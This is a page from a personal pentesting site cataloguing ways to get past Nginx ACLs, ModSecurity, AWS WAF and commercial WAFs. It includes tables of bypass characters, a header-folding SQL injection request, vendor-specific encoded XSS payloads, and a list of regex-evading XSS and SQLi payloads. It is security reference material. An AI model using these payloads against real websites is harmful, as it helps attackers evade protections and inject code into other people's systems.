<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Proxy / WAF Protections Bypass | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/projects/pentesting-web/2025-01-01-proxy-waf-protections-bypass/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item active"> <a class="nav-link" href="/projects/">projects <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item "> <a class="nav-link" href="/teaching/">teaching </a> </li> <li class="nav-item "> <a class="nav-link" href="/people/">people </a> </li> <li class="nav-item "> <a class="nav-link" href="/hacking/">hacking </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/publications/">publications</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/projects/">projects</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">Proxy / WAF Protections Bypass</h1> <p class="post-description"></p> </header> <article> <h1 id="proxy--waf-protections-bypass">Proxy / WAF Protections Bypass</h1> <h2 id="bypass-nginx-acl-rules-with-pathname-manipulation-">Bypass Nginx ACL Rules with Pathname Manipulation <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a> </h2> <p>Techniques <a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies" rel="external nofollow noopener" target="_blank">from this research</a>.</p> <p>Nginx rule example:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location = /admin {
    deny all;
}

location = /admin/ {
    deny all;
}
</code></pre></div></div> <p>In order to prevent bypasses Nginx performs path normalization before checking it. However, if the backend server performs a different normalization (removing characters that nginx doesn’t remove) it might be possible to bypass this defense.</p> <h3 id="nodejs---express"><strong>NodeJS - Express</strong></h3> <table> <thead> <tr> <th>Nginx Version</th> <th><strong>Node.js Bypass Characters</strong></th> </tr> </thead> <tbody> <tr> <td>1.22.0</td> <td><code class="language-plaintext highlighter-rouge">\xA0</code></td> </tr> <tr> <td>1.21.6</td> <td><code class="language-plaintext highlighter-rouge">\xA0</code></td> </tr> <tr> <td>1.20.2</td> <td> <code class="language-plaintext highlighter-rouge">\xA0</code>, <code class="language-plaintext highlighter-rouge">\x09</code>, <code class="language-plaintext highlighter-rouge">\x0C</code> </td> </tr> <tr> <td>1.18.0</td> <td> <code class="language-plaintext highlighter-rouge">\xA0</code>, <code class="language-plaintext highlighter-rouge">\x09</code>, <code class="language-plaintext highlighter-rouge">\x0C</code> </td> </tr> <tr> <td>1.16.1</td> <td> <code class="language-plaintext highlighter-rouge">\xA0</code>, <code class="language-plaintext highlighter-rouge">\x09</code>, <code class="language-plaintext highlighter-rouge">\x0C</code> </td> </tr> </tbody> </table> <h3 id="flask"><strong>Flask</strong></h3> <table> <thead> <tr> <th>Nginx Version</th> <th><strong>Flask Bypass Characters</strong></th> </tr> </thead> <tbody> <tr> <td>1.22.0</td> <td> <code class="language-plaintext highlighter-rouge">\x85</code>, <code class="language-plaintext highlighter-rouge">\xA0</code> </td> </tr> <tr> <td>1.21.6</td> <td> <code class="language-plaintext highlighter-rouge">\x85</code>, <code class="language-plaintext highlighter-rouge">\xA0</code> </td> </tr> <tr> <td>1.20.2</td> <td> <code class="language-plaintext highlighter-rouge">\x85</code>, <code class="language-plaintext highlighter-rouge">\xA0</code>, <code class="language-plaintext highlighter-rouge">\x1F</code>, <code class="language-plaintext highlighter-rouge">\x1E</code>, <code class="language-plaintext highlighter-rouge">\x1D</code>, <code class="language-plaintext highlighter-rouge">\x1C</code>, <code class="language-plaintext highlighter-rouge">\x0C</code>, <code class="language-plaintext highlighter-rouge">\x0B</code> </td> </tr> <tr> <td>1.18.0</td> <td> <code class="language-plaintext highlighter-rouge">\x85</code>, <code class="language-plaintext highlighter-rouge">\xA0</code>, <code class="language-plaintext highlighter-rouge">\x1F</code>, <code class="language-plaintext highlighter-rouge">\x1E</code>, <code class="language-plaintext highlighter-rouge">\x1D</code>, <code class="language-plaintext highlighter-rouge">\x1C</code>, <code class="language-plaintext highlighter-rouge">\x0C</code>, <code class="language-plaintext highlighter-rouge">\x0B</code> </td> </tr> <tr> <td>1.16.1</td> <td> <code class="language-plaintext highlighter-rouge">\x85</code>, <code class="language-plaintext highlighter-rouge">\xA0</code>, <code class="language-plaintext highlighter-rouge">\x1F</code>, <code class="language-plaintext highlighter-rouge">\x1E</code>, <code class="language-plaintext highlighter-rouge">\x1D</code>, <code class="language-plaintext highlighter-rouge">\x1C</code>, <code class="language-plaintext highlighter-rouge">\x0C</code>, <code class="language-plaintext highlighter-rouge">\x0B</code> </td> </tr> </tbody> </table> <h3 id="spring-boot"><strong>Spring Boot</strong></h3> <table> <thead> <tr> <th>Nginx Version</th> <th><strong>Spring Boot Bypass Characters</strong></th> </tr> </thead> <tbody> <tr> <td>1.22.0</td> <td><code class="language-plaintext highlighter-rouge">;</code></td> </tr> <tr> <td>1.21.6</td> <td><code class="language-plaintext highlighter-rouge">;</code></td> </tr> <tr> <td>1.20.2</td> <td> <code class="language-plaintext highlighter-rouge">\x09</code>, <code class="language-plaintext highlighter-rouge">;</code> </td> </tr> <tr> <td>1.18.0</td> <td> <code class="language-plaintext highlighter-rouge">\x09</code>, <code class="language-plaintext highlighter-rouge">;</code> </td> </tr> <tr> <td>1.16.1</td> <td> <code class="language-plaintext highlighter-rouge">\x09</code>, <code class="language-plaintext highlighter-rouge">;</code> </td> </tr> </tbody> </table> <h3 id="php-fpm"><strong>PHP-FPM</strong></h3> <p>Nginx FPM configuration:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location = /admin.php {
    deny all;
}

location ~ \.php$ {
    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
</code></pre></div></div> <p>Nginx is configured to block access to <code class="language-plaintext highlighter-rouge">/admin.php</code> but it’s possible to bypass this by accessing <code class="language-plaintext highlighter-rouge">/admin.php/index.php</code>.</p> <h3 id="how-to-prevent">How to prevent</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>location ~* ^/admin {
    deny all;
}
</code></pre></div></div> <h2 id="bypass-mod-security-rules-">Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a> </h2> <h3 id="path-confusion">Path Confusion</h3> <p><a href="https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/" rel="external nofollow noopener" target="_blank"><strong>In this post</strong></a> is explained that ModSecurity v3 (until 3.0.12), <strong>improperly implemented the <code class="language-plaintext highlighter-rouge">REQUEST_FILENAME</code></strong> variable which was supposed to contain the accessed path (until the start of the parameters). This is because it performed an URL decode to get the path.<br> Therefore, a request like <code class="language-plaintext highlighter-rouge">http://example.com/foo%3f';alert(1);foo=</code> in mod security will suppose that the path is just <code class="language-plaintext highlighter-rouge">/foo</code> because <code class="language-plaintext highlighter-rouge">%3f</code> is transformed into <code class="language-plaintext highlighter-rouge">?</code> ending the URL path, but actually the path that a server will receive will be <code class="language-plaintext highlighter-rouge">/foo%3f';alert(1);foo=</code>.</p> <p>The variables <code class="language-plaintext highlighter-rouge">REQUEST_BASENAME</code> and <code class="language-plaintext highlighter-rouge">PATH_INFO</code> were also affected by this bug.</p> <p>Something similar ocurred in version 2 of Mod Security that allowed to bypass a protection that prevented user accessing files with specific extensions related to backup files (such as <code class="language-plaintext highlighter-rouge">.bak</code>) simply by sending the dot URL encoded in <code class="language-plaintext highlighter-rouge">%2e</code>, for example: <code class="language-plaintext highlighter-rouge">https://example.com/backup%2ebak</code>.</p> <h2 id="bypass-aws-waf-acl-">Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a> </h2> <h3 id="malformed-header">Malformed Header</h3> <p><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies" rel="external nofollow noopener" target="_blank">This research</a> mentions that it was possible to bypass AWS WAF rules applied over HTTP headers by sending a “malformed” header that wasn’t properly parsed by AWS but it was by the backend server.</p> <p>For example, sending the following request with a SQL injection in the header X-Query:</p> <div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
</span></code></pre></div></div> <p>It was possible to bypass AWS WAF because it wouldn’t understand that the next line is part of the value of the header while the NODEJS server did (this was fixed).</p> <h2 id="generic-waf-bypasses">Generic WAF bypasses</h2> <h3 id="request-size-limits">Request Size Limits</h3> <p>Commonly WAFs have a certain length limit of requests to check and if a POST/PUT/PATCH request is over it, the WAF won’t check the request.</p> <ul> <li>For AWS WAF, you can <a href="https://docs.aws.amazon.com/waf/latest/developerguide/limits.html" rel="external nofollow noopener" target="_blank"><strong>check the documentation</strong></a><strong>:</strong> </li> </ul> <table data-header-hidden=""> <thead><tr> <th width="687"></th> <th></th> </tr></thead> <tbody> <tr> <td>Maximum size of a web request body that can be inspected for Application Load Balancer and AWS AppSync protections</td> <td>8 KB</td> </tr> <tr> <td>Maximum size of a web request body that can be inspected for CloudFront, API Gateway, Amazon Cognito, App Runner, and Verified Access protections**</td> <td>64 KB</td> </tr> </tbody> </table> <ul> <li>From <a href="https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits" rel="external nofollow noopener" target="_blank"><strong>Azure docs</strong></a><strong>:</strong> </li> </ul> <p>Older Web Application Firewalls with Core Rule Set 3.1 (or lower) allow messages larger than <strong>128 KB</strong> by turning off request body inspection, but these messages won’t be checked for vulnerabilities. For newer versions (Core Rule Set 3.2 or newer), the same can be done by disabling the maximum request body limit. When a request exceeds the size limit:</p> <p>If p<strong>revention mode</strong>: Logs and blocks the request.<br> If <strong>detection mode</strong>: Inspects up to the limit, ignores the rest, and logs if the <code class="language-plaintext highlighter-rouge">Content-Length</code> exceeds the limit.</p> <ul> <li>From <a href="https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US" rel="external nofollow noopener" target="_blank"><strong>Akamai</strong></a><strong>:</strong> </li> </ul> <p>By default, the WAF inspects only the first 8KB of a request. It can increase the limit up to 128KB by adding Advanced Metadata.</p> <ul> <li>From <a href="https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields" rel="external nofollow noopener" target="_blank"><strong>Cloudflare</strong></a><strong>:</strong> </li> </ul> <p>Up to 128KB.</p> <h3 id="obfuscation-">Obfuscation <a href="#obfuscation" id="obfuscation"></a> </h3> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># IIS, ASP Clasic</span>
&lt;%s%cr%u0131pt&gt; <span class="o">==</span> &lt;script&gt;

<span class="c"># Path blacklist bypass - Tomcat</span>
/path1/path2/ <span class="o">==</span> <span class="p">;</span>/path1<span class="p">;</span>foo/path2<span class="p">;</span>bar/<span class="p">;</span>
</code></pre></div></div> <h3 id="unicode-compatability-">Unicode Compatability <a href="#unicode-compatability" id="unicode-compatability"></a> </h3> <p>Depending on the implementation of Unicode normalization (more info <a href="https://jlajara.gitlab.io/Bypass_WAF_Unicode" rel="external nofollow noopener" target="_blank">here</a>), characters that share Unicode compatability may be able to bypass the WAF and execute as the intended payload. Compatible characters can be found <a href="https://www.compart.com/en/unicode" rel="external nofollow noopener" target="_blank">here</a>.</p> <h4 id="example-">Example <a href="#example" id="example"></a> </h4> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># under the NFKD normalization algorithm, the characters on the left translate</span>
<span class="c"># to the XSS payload on the right</span>
＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥  <span class="nt">--</span><span class="o">&gt;</span> ＜img <span class="nv">src</span><span class="o">=</span>p <span class="nv">onerror</span><span class="o">=</span><span class="s1">'prompt(1)'</span><span class="o">&gt;</span>
</code></pre></div></div> <h3 id="bypass-contextual-wafs-with-encodings-">Bypass Contextual WAFs with encodings <a href="#ip-rotation" id="ip-rotation"></a> </h3> <p>As mentioned in <a href="https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization" rel="external nofollow noopener" target="_blank"><strong>this blog post</strong></a>, In order to bypass WAFs able to maintain a context of the user input we could abuse the WAF techniques to actually normalize the users input.</p> <p>For example, in the post it’s mentioned that <strong>Akamai URL decoded a user input 10 times</strong>. Therefore something like <code class="language-plaintext highlighter-rouge">&lt;input/%2525252525252525253e/onfocus</code> will be seen by Akamai as <code class="language-plaintext highlighter-rouge">&lt;input/&gt;/onfocus</code> which <strong>might think that it’s ok as the tag is closed</strong>. However, as long as the application doesn’t URL decode the input 10 times, the victim will see something like <code class="language-plaintext highlighter-rouge">&lt;input/%25252525252525253e/onfocus</code> which is <strong>still valid for a XSS attack</strong>.</p> <p>Therefore, this allows to <strong>hide payloads in encoded components</strong> that the WAF will decode and interpret while the victim won’t.</p> <p>Moreover, this can be done not only with URL encoded payloads but also with other encodings such as unicode, hex, octal…</p> <p>In the post the following final bypasses are suggested:</p> <ul> <li>Akamai:<code class="language-plaintext highlighter-rouge">akamai.com/?x=&lt;x/%u003e/tabindex=1 autofocus/onfocus=x=self;x['ale'%2b'rt'](999)&gt;</code> </li> <li>Imperva:<code class="language-plaintext highlighter-rouge">imperva.com/?x=&lt;x/\x3e/tabindex=1 style=transition:0.1s autofocus/onfocus="a=document;b=a.defaultView;b.ontransitionend=b['aler'%2b't'];style.opacity=0;Object.prototype.toString=x=&gt;999"&gt;</code> </li> <li>AWS/Cloudfront:<code class="language-plaintext highlighter-rouge">docs.aws.amazon.com/?x=&lt;x/%26%23x3e;/tabindex=1 autofocus/onfocus=alert(999)&gt;</code> </li> <li>Cloudflare:<code class="language-plaintext highlighter-rouge">cloudflare.com/?x=&lt;x tabindex=1 autofocus/onfocus="style.transition='0.1s';style.opacity=0;self.ontransitionend=alert;Object.prototype.toString=x=&gt;999"&gt;</code> </li> </ul> <p>It’s also mentioned that depending on <strong>how some WAFs understand the context</strong> of the user input, it might be possible to abuse it. The proposed example in the blog is that Akamai allow(ed) to put anything between <code class="language-plaintext highlighter-rouge">/*</code> and <code class="language-plaintext highlighter-rouge">*/</code> (potentially because this is commonly used as comments. Therefore, a SQLinjection such as <code class="language-plaintext highlighter-rouge">/*'or sleep(5)-- -*/</code> won’t be caught and will be valid as <code class="language-plaintext highlighter-rouge">/*</code> is the starting string of the injection and <code class="language-plaintext highlighter-rouge">*/</code> is commented.</p> <p>These kind of context problems can also be used to <strong>abuse other vulnerabilities than the one expected</strong> to be exploited by the WAF (e.g. this could also be used to exploit a XSS).</p> <h3 id="h2c-smuggling-">H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a> </h3> <p>h2c-smuggling.md</p> <h3 id="ip-rotation-">IP Rotation <a href="#ip-rotation" id="ip-rotation"></a> </h3> <ul> <li> <a href="https://github.com/ustayready/fireprox" rel="external nofollow noopener" target="_blank">https://github.com/ustayready/fireprox</a>: Generate an API gateway URL to by used with ffuf</li> <li> <a href="https://github.com/rootcathacking/catspin" rel="external nofollow noopener" target="_blank">https://github.com/rootcathacking/catspin</a>: Similar to fireprox</li> <li> <a href="https://github.com/PortSwigger/ip-rotate" rel="external nofollow noopener" target="_blank">https://github.com/PortSwigger/ip-rotate</a>: Burp Suite plugin that uses API gateway IPs</li> <li> <a href="https://github.com/fyoorer/ShadowClone" rel="external nofollow noopener" target="_blank">https://github.com/fyoorer/ShadowClone</a>: A dynamically determined number of container instances are activated based on the input file size and split factor, with the input split into chunks for parallel execution, such as 100 instances processing 100 chunks from a 10,000-line input file with a split factor of 100 lines.</li> <li><a href="https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization" rel="external nofollow noopener" target="_blank">https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization</a></li> </ul> <h3 id="regex-bypasses">Regex Bypasses</h3> <p>Different techniques can be used to bypass the regex filters on the firewalls. Examples include alternating case, adding line breaks, and encoding payloads. Resources for the various bypasses can be found at <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads" rel="external nofollow noopener" target="_blank">PayloadsAllTheThings</a> and <a href="https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html" rel="external nofollow noopener" target="_blank">OWASP</a>. The examples below were pulled from <a href="https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2" rel="external nofollow noopener" target="_blank">this article</a>.</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;sCrIpT&gt;alert<span class="o">(</span>XSS<span class="o">)</span>&lt;/sCriPt&gt; <span class="c">#changing the case of the tag</span>
<span class="o">&lt;&lt;</span><span class="no">script</span><span class="sh">&gt;alert(XSS)&lt;/script&gt; #prepending an additional "&lt;"
&lt;script&gt;alert(XSS) // #removing the closing tag
&lt;script&gt;alert`XSS`&lt;/script&gt; #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
&lt;iframe src=http://malicous.com &lt; #double open angle brackets
&lt;STYLE&gt;.classname{background-image:url("javascript:alert(XSS)");}&lt;/STYLE&gt; #uncommon tags
&lt;img/src=1/onerror=alert(0)&gt; #bypass space filter by using / where a space is expected
&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)&gt;xss&lt;/a&gt; #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
&lt;iframe src="javascript:alert(`xss`)"&gt; #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt</span><span class="se">\`</span><span class="sh">6</span><span class="se">\`</span><span class="sh">`; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
&lt;a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"&gt; #Using Line Feed (LF) line breaks
&lt;BODY onload!#</span><span class="nv">$%</span><span class="sh">&amp;()*~+-_.,:;?@[/|</span><span class="se">\]</span><span class="sh">^`=confirm()&gt; # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
</span></code></pre></div></div> <h2 id="tools">Tools</h2> <ul> <li> <a href="https://github.com/assetnote/nowafpls" rel="external nofollow noopener" target="_blank"><strong>nowafpls</strong></a>: Burp plugin to add junk data to requests to bypass WAFs by length</li> </ul> <h2 id="references">References</h2> <ul> <li><a href="https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies" rel="external nofollow noopener" target="_blank">https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies</a></li> <li><a href="https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/" rel="external nofollow noopener" target="_blank">https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/</a></li> <li><a href="https://www.youtube.com/watch?v=0OMmWtU2Y_g" rel="external nofollow noopener" target="_blank">https://www.youtube.com/watch?v=0OMmWtU2Y_g</a></li> <li><a href="https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization" rel="external nofollow noopener" target="_blank">https://0x999.net/blog/exploring-javascript-events-bypassing-wafs-via-character-normalization#bypassing-web-application-firewalls-via-character-normalization</a></li> </ul> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>